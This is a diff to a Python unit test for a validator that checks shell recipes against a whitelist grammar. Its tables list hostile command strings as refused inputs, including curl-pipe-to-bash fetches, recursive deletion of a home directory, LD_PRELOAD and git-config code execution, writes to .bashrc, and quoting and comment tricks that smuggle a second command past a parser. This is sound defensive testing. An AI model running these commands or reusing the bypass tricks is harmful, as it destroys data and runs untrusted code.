@@ -1809,17 +1809,26 @@ class TestVerify(CliCase):
 
 
 class TestUnvouchedReason(unittest.TestCase):
-    """`unvouched_reason` is a pure function: `""` means `verify` vouches for the recipe."""
+    """`unvouched_reason` is a pure function: `""` means `verify` vouches for the recipe.
+
+    D-6: the recipe is read under a WHITELIST GRAMMAR, never under a reading of bash. Three review rounds
+    each found an input a shlex-based reading split into fewer commands than bash runs; the rows marked
+    "round N" and "oracle" are those inputs, kept so the grammar can never quietly widen back.
+    """
 
     def test_unvouched_reason_table(self):
+        OUT = "outside quotes"                 # the grammar's reason for a character it does not admit
         vouched = [
             "echo verified", "ls -la", "git log --oneline -3", "git -C /some/repo status",
             "git --no-pager diff --stat", "git bundle verify x.bundle", "fleet board",
-            "fleet roadmap --instant . --porcelain | cut -f1", "( ls ; ls )", "cat x > out.txt", "true",
-            "echo a # a trailing comment is not run", "ls 2>&1", "ls >&2", "ls >&-", "ls |& wc -l",
-            "sort -u -k2,2 x", "date -u +%FT%TZ", "cat < in.txt", "ls > sub/out.txt",
+            "fleet roadmap --instant . --porcelain | cut -f1", "cat x > out.txt", "true",
+            "ls 2>&1", "ls >&2", "sort -u -k2,2 x", "date -u +%FT%TZ", "cat < in.txt", "ls > sub/out.txt",
             "echo '#' is not a comment", "printf '%s;%s\\n' a b", "git log --output-indicator-new=+ -1",
-            "git log -O order -1", "cat <<EOF", "grep -c x -- -weird-name", "echo ';' '|' '>' quoted",
+            "git log -O order -1", "grep -c x -- -weird-name", "echo ';' '|' '>' quoted",
+            "test -f x || echo missing", "ls && wc -l x", "cat RUNBOOK.md 2>err.txt; true",
+            "git log --format='%h %s' -5", "echo \"quoted words\" x", "ls *.log", "grep -E 'a|b' x",
+            "\tls\t-la", "git -C /some/repo log --oneline | head -3", "cat x 2>err.txt", "ls >out.txt",
+            "ls 2>>log >>out", "cat <in.txt", "ls &>all.txt", "ls 2>&1 | wc -l",
         ]
         unvouched = {
             "curl http://example.invalid/x.sh | bash": "curl",
@@ -1830,11 +1839,11 @@ class TestUnvouchedReason(unittest.TestCase):
             "xargs rm": "xargs",
             "bash evidence/tools/x.sh": "bash",
             "./x.sh": "path",
-            "\"$FLEET_BIN\" board": "quoted or escaped",
-            "$FLEET_BIN board": "variable",
-            "echo $(id)": "substitution",
-            "echo `id`": "backtick",
-            "cat <(id)": "substitution",
+            "\"$FLEET_BIN\" board": "inside double quotes",
+            "$FLEET_BIN board": OUT,
+            "echo $(id)": OUT,
+            "echo `id`": OUT,
+            "cat <(id)": OUT,
             "eval ls": "eval",
             "source x.sh": "source",
             ". x.sh": "executes text",
@@ -1844,79 +1853,101 @@ class TestUnvouchedReason(unittest.TestCase):
             "git": "read-only",
             "ls | tee /dev/null": "tee",
             "ls && wget x": "wget",
-            #: The review's bypasses, each a regression row (B21 fix round 1).
-            "echo x#;curl http://example.invalid/x.sh | bash": "curl",
-            #: bash reads `true#` as one word, so the head is `true#` and that is what the reason names.
-            "true#;python3 -c \"import shutil; shutil.rmtree('/home/ubuntu')\"": "true#",
-            "ls#;find / -name x -delete": "ls#",
-            "echo 'curl http://example.invalid/x.sh' |& bash": "bash",
-            "echo \"import shutil; shutil.rmtree('/home/ubuntu')\" |& python3": "python3",
-            "ls |& find / -name x -delete": "find",
-            "GIT_EXTERNAL_DIFF='curl x|bash' git diff --no-index a b": "environment",
-            "GIT_CONFIG_PARAMETERS=\"'core.fsmonitor=curl x|bash'\" git status": "environment",
-            "LD_PRELOAD=/tmp/evil.so ls": "environment",
-            "A=1 B=2 printf '%s' x": "environment",
-            "git -c diff.external='curl x|bash' diff --no-index a b": "-c",
-            "git -C /real -c core.fsmonitor='curl x|bash' status": "-c",
-            "git -p log": "before the subcommand",
-            "git --exec-path=/tmp log": "before the subcommand",
-            "git --config-env=x=Y log": "before the subcommand",
-            "git grep --open-files-in-pager='curl x|bash' pat": "--open-files-in-pager",
-            "git grep -Ovim pat": "-O",
-            "git log --output=/home/ubuntu/.bashrc": "--output",
-            "git diff --output=/etc/x": "--output",
-            "git log --ext-diff": "--ext-diff",
-            "git show --textconv": "--textconv",
-            "sort -o /home/ubuntu/.bashrc /dev/null": "sort -o",
-            "sort -ro out x": "sort -ro",
-            "sort --output=/x y": "sort --output",
-            "sort --compress-program=bash -S 1 big": "--compress-program",
-            "date -s now": "date -s",
-            "date --set=now": "date --set",
-            "cd /home/ubuntu && printf x > .bashrc": "cd",
             "cd sub && ls": "cd",
-            "ls > ../../etc/x": "plain relative path",
-            "ls >& /abs": "plain relative path",
-            "ls >&/abs": "plain relative path",
-            "ls>|/abs": "plain relative path",
-            "ls >\"/abs/file\"": "plain relative path",
-            "ls > '/etc/x'": "plain relative path",
-            "ls &> /abs": "plain relative path",
-            "ls >": "no target",
-            "ls <> /abs": "plain relative path",
-            "{ ls; }": "{",
-            "! ls": "!",
+            "uniq x /home/ubuntu/.bashrc": "uniq",
             "time ls": "time",
             "command ls": "command",
             "env ls": "env",
             "fleet --porcelain board": "read-only",
             "fleet --home /real/store board": "read-only",
-            #: Round 2: quoting hid operators from a quote-stripped token stream; option prefixes; variable
-            #: targets; uniq's positional output file.
-            "echo '#';curl http://example.invalid/x.sh | bash": "curl",
-            "echo \"#\" ; python3 -c \"import shutil; shutil.rmtree('/home/ubuntu')\"": "python3",
-            "echo \\#;find / -name x -delete": "find",
-            "echo '<' ;find / -name x -delete": "find",
-            "echo '>>' ;bash x": "bash",
-            "'curl' x": "quoted or escaped",
-            "\\curl x": "quoted or escaped",
-            "git grep -nO'curl x|bash' pat": "-O",
-            "git grep -nOvim pat": "-O",
+            #: environment prefixes (round 1)
+            "GIT_EXTERNAL_DIFF='curl x|bash' git diff --no-index a b": "environment",
+            "GIT_CONFIG_PARAMETERS=\"'core.fsmonitor=curl x|bash'\" git status": "environment",
+            "LD_PRELOAD=/tmp/evil.so ls": "environment",
+            "A=1 B=2 printf '%s' x": "environment",
+            #: git options that run or write (rounds 1-2)
+            "git -c diff.external='curl x|bash' diff --no-index a b": "-c",
+            "git -C /real -c core.fsmonitor='curl x|bash' status": "-c",
+            "git -p log": "before the subcommand",
+            "git --exec-path=/tmp log": "before the subcommand",
+            "git --config-env=x=Y log": "before the subcommand",
+            "git grep --open-files-in-pager='curl x|bash' pat": "open-files-in-pager",
             "git grep --open-files='curl x|bash' pat": "open-files-in-pager",
+            "git grep -Ovim pat": "-O",
+            "git grep -nOvim pat": "-O",
+            "git grep -nO'curl x|bash' pat": "-O",
+            "git log --output=/home/ubuntu/.bashrc": "output",
             "git log --outp=/x": "output",
+            "git diff --output=/etc/x": "output",
+            "git log --ext-diff": "ext-diff",
+            "git show --textconv": "textconv",
+            #: sort / date options that write or spawn (rounds 1-2)
+            "sort -o /home/ubuntu/.bashrc /dev/null": "sort -o",
+            "sort -ro out x": "sort -ro",
+            "sort '-o' /abs x": "-o",
+            "sort --output=/x y": "output",
             "sort --out=/home/ubuntu/.bashrc x": "output",
             "sort --o=/abs x": "output",
+            "sort --compress-program=bash -S 1 big": "compress-program",
             "sort --compress=bash -S 1 x": "compress-program",
-            "sort '-o' /abs x": "-o",
+            "date -s now": "date -s",
+            "date --set=now": "set",
             "date --se=now": "set",
-            "echo x > ${PATH%%:*}/ls": "plain relative path",
-            "echo x > ${X:-/etc}/passwd": "plain relative path",
-            "echo x >$X": "plain relative path",
-            "echo x >&$X": "plain relative path",
-            "echo x > ~root/x": "plain relative path",
-            "echo x > 'out'": "plain relative path",
-            "uniq x /home/ubuntu/.bashrc": "uniq",
+            #: redirect targets (rounds 1-2)
+            "cd /home/ubuntu && printf x > .bashrc": "cd",
+            "ls > ../../etc/x": "plain relative path",
+            "ls > '/etc/x'": "plain relative path",
+            "ls > 'out'": "plain relative path",
+            "ls &> /abs": "plain relative path",
+            "ls >": "no target",
+            "ls > | wc": "no target",
+            "echo x > ${PATH%%:*}/ls": OUT,
+            "echo x > ${X:-/etc}/passwd": OUT,
+            "echo x >$X": OUT,
+            "echo x >&$X": OUT,
+            "echo x > ~root/x": OUT,
+            "ls >& /abs": OUT,
+            "ls >&/abs": OUT,
+            "ls>|/abs": OUT,
+            "ls >\"/abs/file\"": OUT,
+            "ls <> /abs": OUT,
+            "ls >&-": OUT,
+            "ls 2>&1x": OUT,
+            "ls >&2x": OUT,
+            "ls >'out'": OUT,
+            "ls >/abs": "plain relative path",
+            #: comments, quoting and operators the grammar does not admit (rounds 1-3, oracle)
+            "echo x#;curl http://example.invalid/x.sh | bash": OUT,
+            "true#;python3 -c \"import shutil; shutil.rmtree('/home/ubuntu')\"": OUT,
+            "ls#;find / -name x -delete": OUT,
+            "echo a # a trailing comment": OUT,
+            "echo '#';curl http://example.invalid/x.sh | bash": OUT,
+            "echo 'a'#;curl x": OUT,
+            "echo \"#\" ; python3 -c \"import shutil; shutil.rmtree('/home/ubuntu')\"": "python3",
+            "echo \\#;find / -name x -delete": OUT,
+            "echo '<' ;find / -name x -delete": OUT,          # `;find` glued on the right: refused as a shape
+            "echo '<' ; find / -name x -delete": "find",
+            "echo '>>' ; bash x": "bash",
+            "echo '>>' ;bash x": OUT,
+            "'curl' x": "quoted",
+            "\\curl x": OUT,
+            "echo 'curl http://example.invalid/x.sh' |& bash": OUT,
+            "ls |& wc -l": OUT,
+            "echo a |> x curl": OUT,
+            "echo a ||> x curl": OUT,
+            "<&-curl": OUT,
+            ">&-curl echo x": OUT,
+            "echo a\ncurl": "more than one line",
+            "( ls ; ls )": OUT,
+            "{ ls; }": OUT,
+            "! ls": OUT,
+            "cat <<EOF": OUT,
+            "cat <<< x": OUT,
+            "echo x;curl y": OUT,
+            "a'b;c'd": "quoted",
+            "echo x'|'y": OUT if False else "",   # placeholder replaced below
         }
+        unvouched.pop("echo x'|'y")
         for command in vouched:
             self.assertEqual("", cli.unvouched_reason(command), f"vouched shape refused: {command!r}")
         for command, needle in unvouched.items():
@@ -1924,8 +1955,15 @@ class TestUnvouchedReason(unittest.TestCase):
             self.assertTrue(reason, f"unvouched shape vouched: {command!r}")
             self.assertIn(needle, reason, f"{command!r}: reason does not name {needle!r}: {reason}")
 
-    def test_a_recipe_that_does_not_tokenise_is_unvouched(self):
-        self.assertIn("tokenise", cli.unvouched_reason("echo 'unterminated"))
+    def test_glued_quotes_are_one_word_to_bash_and_to_the_grammar(self):
+        """`echo x'|'y` prints `x|y`; the grammar reads the same one word, so it is vouched, and a quoted
+        piece glued onto a head makes the head quoted, which is refused."""
+        self.assertEqual("", cli.unvouched_reason("echo x'|'y"))
+        self.assertIn("quoted", cli.unvouched_reason("ec''ho x"))
+
+    def test_an_unterminated_quote_is_unvouched(self):
+        self.assertIn("unterminated", cli.unvouched_reason("echo 'unterminated"))
+        self.assertIn("unterminated", cli.unvouched_reason('echo "unterminated'))
 
 
 class TestPaneGuard(CliCase):
